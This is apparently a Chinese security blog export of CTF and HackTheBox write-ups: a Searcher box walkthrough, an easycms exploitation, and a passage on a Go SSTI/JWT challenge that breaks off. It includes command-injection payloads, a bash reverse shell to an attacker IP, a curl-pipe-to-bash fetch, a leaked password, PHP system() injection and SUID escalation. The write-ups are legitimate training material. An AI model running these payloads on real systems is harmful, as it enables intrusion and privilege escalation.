<pre class="line-numbers language-none"><code class="language-none">compile() 用于将源代码编译为代码对象或AST模块对象。可以根据提供的模式使用exec()或eval()函数执行返回的代码对象，以构造代码对象。
语法：compile(source, filename, mode, flags=0, dont_inherit=False, optimize=-1)

source: 必选项，表示要编译的源代码，可以是字符串、文件或AST（Abstract Syntax Tree）对象。
filename: 可选项，表示编译代码的文件名，如果不是从文件中编译代码，传入 “&lt;string&gt;” 即可。
mode: 可选项，表示编译代码类型，可以取值为 “exec”（编译整个代码），“eval”（编译单个表达式）或“single”（编译单个语句）。
flags: 可选项，传入变量或位掩码，用于控制编译器的行为或特性。
dont_inherit: 可选项，表示是否继承sys.flags和sys.__optimizations__模块中相关选项的值。
optimize: 可选项，指定编译器的优化级别，若设置为-1，表示使用默认优化级别。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>自己本地用python测试一下，如下</p>
<pre class="line-numbers language-none"><code class="language-none">test = compile("import os\nos.system('id')","&lt;String&gt;","exec")
eval(test)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410174447442.png"></p>
<p>如图可以成功执行<code>id</code>命令</p>
<p>那就尝试修改请求包，传递如下query值，执行<code>id</code>命令（前面<code>1'</code>和后面<code>'</code>用于闭合，中间有空格的地方用加号连接。实际测试有没有加号都可以，但前后两个<code>%2b</code>需要加，且用空格和%20替代行不通）</p>
<pre class="line-numbers language-none"><code class="language-none">query=1'%2beval(compile("import+os\nos.system('id')",'&lt;String&gt;','exec'))%2b'

传到CLI后：
searchor Apple '1' eval(compile("import os\nos.system('id')",'&lt;String&gt;','exec')) '' --copy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410173619288.png"></p>
<p>可看到有三个地方展示了回显：响应头部<code>Location</code>、响应内容<code>&lt;a&gt;</code>标签<code>href</code>值、响应内容<code>&lt;a&gt;</code>标签文本。且当前用户是<code>svc</code></p>
<p>再用如下语句执行<code>ls</code>命令查看当前目录下内容</p>
<pre class="line-numbers language-none"><code class="language-none">query=1'%2beval(compile("import+os\nos.system('ls')",'&lt;String&gt;','exec'))%2b'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410185732026.png"></p>
<p>有<code>app.py</code>和<code>templates</code></p>
<p>然后执行<code>cat app.py</code>命令查看<code>app.py</code>内容</p>
<pre class="line-numbers language-none"><code class="language-none">query=1'%2beval(compile("import+os\nos.system('cat+app.py')",'&lt;String&gt;','exec'))%2b'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410200023303.png"></p>
<p>URL解码得如下代码，从代码中也可以看到post传参的逻辑</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect
<span class="token keyword">from</span> searchor <span class="token keyword">import</span> Engine
<span class="token keyword">import</span> subprocess

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> options<span class="token operator">=</span>Engine<span class="token punctuation">.</span>__members__<span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/search'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        engine <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'engine'</span><span class="token punctuation">)</span>
        query <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">)</span>
        auto_redirect <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'auto_redirect'</span><span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> engine <span class="token keyword">in</span> Engine<span class="token punctuation">.</span>__members__<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            arg_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'searchor'</span><span class="token punctuation">,</span> <span class="token string">'search'</span><span class="token punctuation">,</span> engine<span class="token punctuation">,</span> query<span class="token punctuation">]</span>
            r <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>arg_list<span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
            url <span class="token operator">=</span> r<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> auto_redirect <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url<span class="token punctuation">,</span> code<span class="token operator">=</span><span class="token number">302</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> url

        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> options<span class="token operator">=</span>Engine<span class="token punctuation">.</span>__members__<span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"Invalid engine!"</span><span class="token punctuation">)</span>

    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> options<span class="token operator">=</span>Engine<span class="token punctuation">.</span>__members__<span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">"Something went wrong!"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接下来尝试反弹shell</p>
<p>攻击机开启nc监听和http服务</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 9898
python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>攻击机新建一个反弹shell文件<code>rev_shell.txt</code>，内容如下</p>
<pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Burp修改请求包query参数如下</p>
<pre class="line-numbers language-none"><code class="language-none">query=1'%2beval(compile("import+os\nos.system('curl+10.10.14.7/rev_shell.txt|bash')",'&lt;String&gt;','exec'))%2b'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>发送请求包，成功反弹shell，获取svc用户权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410200356098.png"></p>
<h2 id="四、Git信息泄露"><a href="#四、Git信息泄露" class="headerlink" title="四、Git信息泄露"></a>四、Git信息泄露</h2><p>查看当前目录下文件，看到有<code>.git</code>，尝试git-dump和Githack下载失败，只能硬看</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410202411535.png"></p>
<p>看到<code>config</code>文件里有用户名密码</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410202439506.png"></p>
<pre class="line-numbers language-none"><code class="language-none">cody:jh1usoih2bkjaspwe92<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>PS：后面的<code>gitea.searcher.htb</code>是个子域，加进hosts文件看了一眼，是个类似git仓库的东西，有两个用户<code>cody</code>和<code>administrator</code>，估计也是一条路线，但没过多尝试</p>
<h2 id="五、SUID提权"><a href="#五、SUID提权" class="headerlink" title="五、SUID提权"></a>五、SUID提权</h2><p>在svc用户尝试执行<code>sudo -l</code>，发现提示需要<code>-S</code>参数输入密码</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410203854475.png"></p>
<p>执行<code>sudo -l -S</code>，尝试密码，是上面cody的密码（PS：在HackTheBox遇见好几次这种张冠李戴的事…）</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410203820884.png"></p>
<p>可看到有一条命令可以以root身份执行，sudo执行该命令</p>
<pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/python3 /opt/scripts/system-checkup.py *<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410204703295.png"></p>
<p>提示三个用法，前两个是查看docker容器的相关信息，用处不大，第三个尝试会报错，如下</p>
<pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410205015580.png"></p>
<p>想看一下<code>/opt/scripts/system-checkup.py</code>，没权限，就用<code>find</code>命令模糊查找<code>full-checkup</code>，发现有<code>/opt/scripts/full-checkup.sh</code>，但svc用户没有可写权限没法更改，那就尝试在当前目录<code>/home/svc</code>新建一个同名文件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230411151914512.png"></p>
<p>靶机shell环境不方便编辑文件，我们在攻击机创建<code>full-checkup.sh</code>，内容如下</p>
<pre class="line-numbers language-none"><code class="language-none">#!/bin/bash
chmod +s /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>然后在靶机用<code>wget</code>把<code>full-checkup.sh</code>传过来，并添加可执行权限（注意需在<code>/home/svc</code>目录下操作，别的目录无可写权限）</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.7/full-checkup.sh
chmod +x full-checkup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410205810653.png"></p>
<p>再次执行<code>full-checkup</code>选项，可看到<code>/bin/bash</code>已成功设置suid</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410205833873.png"></p>
<p>执行<code>bash -p</code>成功获取root权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410205918651.png"></p>
<p>Over！</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230411181759774.png" style="zoom: 80%;">

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_58869808/article/details/130050438">https://blog.csdn.net/qq_58869808/article/details/130050438</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>git信息泄露</tag>
        <tag>命令注入</tag>
        <tag>suid提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/posts/4a17b156.html</url>
    <content><![CDATA[<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!!!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
      <categories>
        <category>Hello World</category>
      </categories>
      <tags>
        <tag>Hello World</tag>
      </tags>
  </entry>
  <entry>
    <title>GKCTF2021-easycms</title>
    <url>/posts/3e3db684.html</url>
    <content><![CDATA[<h1 id="GKCTF2021-easycms"><a href="#GKCTF2021-easycms" class="headerlink" title="GKCTF2021-easycms"></a>GKCTF2021-easycms</h1><p>知识点概要：目录遍历、任意代码执行、任意文件下载</p>
<p>题目hint：后台密码5位弱口令</p>
<p>首页</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913100735401.png"></p>
<p>根据题目hint，知道有后台，爆破得后台路径<code>/admin.php</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913100925523.png" style="zoom: 80%;">

<p>弱口令：<code>admin:12356</code></p>
<h2 id="思路一（目录穿越-amp-任意代码执行）"><a href="#思路一（目录穿越-amp-任意代码执行）" class="headerlink" title="思路一（目录穿越&amp;任意代码执行）"></a>思路一（目录穿越&amp;任意代码执行）</h2><p>登录成功后，左侧菜单栏<code>UI</code>→<code>Theme</code>，随便一个主题点击右下角<code>Customize</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913102917390.png" style="zoom: 80%;">

<p>编辑<code>Header</code>，点击右上角<code>Edit</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913103013797.png"></p>
<p>可以写入php代码，写入<code>&lt;?php phpinfo();?&gt;</code>试试</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913120029727.png" style="zoom:80%;">

<p>保存，显示如下，需要创建<code>/var/www/html/system/tmp/saec.txt</code>文件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913120115840.png"></p>
<p>左侧菜单栏，<code>UI</code>→<code>CMPT</code>→<code>Source List</code>，有个上传功能，随便上传个<code>1.txt</code>（大小不能为0kb）</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913120311662.png"></p>
<p>上传好后，点击右上角编辑</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913120359611.png"></p>
<p><code>Title</code>文本框填如下内容（<code>../</code>多一层少一层都不行）</p>
<pre class="line-numbers language-none"><code class="language-none">../../../../../system/tmp/saec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913120554048.png"></p>
<p>保存后，再次点击编辑查看，Path已经变成如下图所示，实现目录穿越</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913120619055.png"></p>
<p>再次回到<code>UI</code>→<code>Theme</code>→<code>Customize</code>，按刚才的步骤写入phpinfo代码后，点击右上角<code>Visual Editor</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913120822641.png"></p>
<p>可看到phpinfo已被成功执行</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913120908384.png"></p>
<p>那么同样写入如下代码，查看flag即可</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php system("cat /flag");?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913130342425.png"></p>
<h2 id="思路二（任意文件下载）"><a href="#思路二（任意文件下载）" class="headerlink" title="思路二（任意文件下载）"></a>思路二（任意文件下载）</h2><p>左侧菜单栏<code>UI</code>→<code>Theme</code>→<code>Customize</code>，点击右上角<code>Export Theme</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913130849657.png"></p>
<p>随便填，点击保存，会自动下载<code>Theme</code>文件</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913130921241.png" style="zoom:80%;">

<p>把下载链接复制出来，theme参数值是base64编码</p>
<pre class="line-numbers language-none"><code class="language-none">http://f68d3c85-3d68-46dd-a9c3-702d9b2c43d4.node4.buuoj.cn:81/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMS56aXA=<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>解码如下</p>
<pre class="line-numbers language-none"><code class="language-none">/var/www/html/system/tmp/theme/default/1.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>那么修改成<code>/flag</code>的base64编码<code>L2ZsYWc=</code></p>
<pre class="line-numbers language-none"><code class="language-none">http://f68d3c85-3d68-46dd-a9c3-702d9b2c43d4.node4.buuoj.cn:81/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L2ZsYWc=<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>访问，下载完成后，记事本打开即可看到flag</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913131202841.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/scrawman/article/details/122619270">https://blog.csdn.net/scrawman/article/details/122619270</a></p>
<p><a href="https://www.cnblogs.com/hiny0/p/15110817.html">https://www.cnblogs.com/hiny0/p/15110817.html</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>任意代码执行</tag>
        <tag>任意文件下载</tag>
        <tag>目录遍历</tag>
      </tags>
  </entry>
  <entry>
    <title>LineCTF2022-gotm</title>
    <url>/posts/4e3093bf.html</url>
    <content><![CDATA[<h1 id="LineCTF2022-gotm"><a href="#LineCTF2022-gotm" class="headerlink" title="LineCTF2022-gotm"></a>LineCTF2022-gotm</h1><p>知识点概要：SSTI模板注入、JWT伪造</p>
<p>题目给出了go源码<strong>（末尾有完整代码）</strong></p>
<p>Account结构体，主要就四个属性</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> Account <span class="token keyword">struct</span> <span class="token punctuation">{</span>
	id         <span class="token builtin">string</span>
	pw         <span class="token builtin">string</span>
	is_admin   <span class="token builtin">bool</span>
	secret_key <span class="token builtin">string</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注册功能：<code>http.HandleFunc("/regist", regist_handler)</code></p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">regist_handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	uid <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">FormValue</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>	#读取参数id值
	upw <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">FormValue</span><span class="token punctuation">(</span><span class="token string">"pw"</span><span class="token punctuation">)</span>	#读取参数pw值

	<span class="token keyword">if</span> uid <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> upw <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">{</span>	#判断id和pw是否为空
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token function">get_account</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">.</span>id <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>	#根据id判断，若用户已存在，报错
		w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusForbidden<span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>acc<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">4</span> <span class="token punctuation">{</span>
		<span class="token function">clear_account</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	new_acc <span class="token operator">:=</span> Account<span class="token punctuation">{</span>uid<span class="token punctuation">,</span> upw<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> secret_key<span class="token punctuation">}</span>	#创建账户的四个属性，只有id和pw可控
	acc <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>acc<span class="token punctuation">,</span> new_acc<span class="token punctuation">)</span>

	p <span class="token operator">:=</span> Resp<span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">}</span>
	res<span class="token punctuation">,</span> err <span class="token operator">:=</span> json<span class="token punctuation">.</span><span class="token function">Marshal</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
	<span class="token punctuation">}</span>
	w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
	<span class="token keyword">return</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注册用户传参如下，注册成功</p>
<pre class="line-numbers language-none"><code class="language-none">/regist?id=2&amp;pw=password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230810134534148.png"></p>
<p>get_account()函数</p>
<pre class="line-numbers language-none"><code class="language-none">func get_account(uid string) Account {
	for i := range acc {
		if acc[i].id == uid {
			return acc[i]
		}
	}
	return Account{}
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>acc在代码前面的定义是<code>var acc []Account</code>，是全局数组变量</p>
<p>登录认证功能：<code>http.HandleFunc("/auth", auth_handler)</code></p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">auth_handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	uid <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">FormValue</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>
	upw <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">FormValue</span><span class="token punctuation">(</span><span class="token string">"pw"</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> uid <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> upw <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>acc<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1024</span> <span class="token punctuation">{</span>
		<span class="token function">clear_account</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	user_acc <span class="token operator">:=</span> <span class="token function">get_account</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span>
	<span class="token keyword">if</span> user_acc<span class="token punctuation">.</span>id <span class="token operator">!=</span> <span class="token string">""</span> <span class="token operator">&amp;&amp;</span> user_acc<span class="token punctuation">.</span>pw <span class="token operator">==</span> upw <span class="token punctuation">{</span>
		token<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">jwt_encode</span><span class="token punctuation">(</span>user_acc<span class="token punctuation">.</span>id<span class="token punctuation">,</span> user_acc<span class="token punctuation">.</span>is_admin<span class="token punctuation">)</span>	#生成jwt
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
			<span class="token keyword">return</span>
		<span class="token punctuation">}</span>
		p <span class="token operator">:=</span> TokenResp<span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">,</span> token<span class="token punctuation">}</span>	#返回jwt
		res<span class="token punctuation">,</span> err <span class="token operator">:=</span> json<span class="token punctuation">.</span><span class="token function">Marshal</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		<span class="token punctuation">}</span>
		w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusForbidden<span class="token punctuation">)</span>
	<span class="token keyword">return</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>用刚才注册的账户认证，认证成功，返回jwt</p>
<pre class="line-numbers language-none"><code class="language-none">/auth?id=2&amp;pw=password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230810134644961.png"></p>
<pre class="line-numbers language-none"><code class="language-none">{"status":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjIiLCJpc19hZG1pbiI6ZmFsc2V9.e418r9xtLSloAZhbw0hbSa-xOF03AqyBoovOzWRkHoA"}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>SSTI漏洞产生位置：<code>http.HandleFunc("/", root_handler)</code></p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">root_handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	token <span class="token operator">:=</span> r<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"X-Token"</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> token <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>
		id<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> <span class="token function">jwt_decode</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>	#从jwt中解析出id属性
		acc <span class="token operator">:=</span> <span class="token function">get_account</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>	#根据id，查找账户
		tpl<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token string">"Logged in as "</span> <span class="token operator">+</span> acc<span class="token punctuation">.</span>id<span class="token punctuation">)</span> #acc<span class="token punctuation">.</span>id存在SSTI
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		<span class="token punctuation">}</span>
		tpl<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token operator">&amp;</span>acc<span class="token punctuation">)</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>

		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230810135001493.png"></p>
<p>flag读取功能：<code>http.HandleFunc("/flag", flag_handler)</code></p>
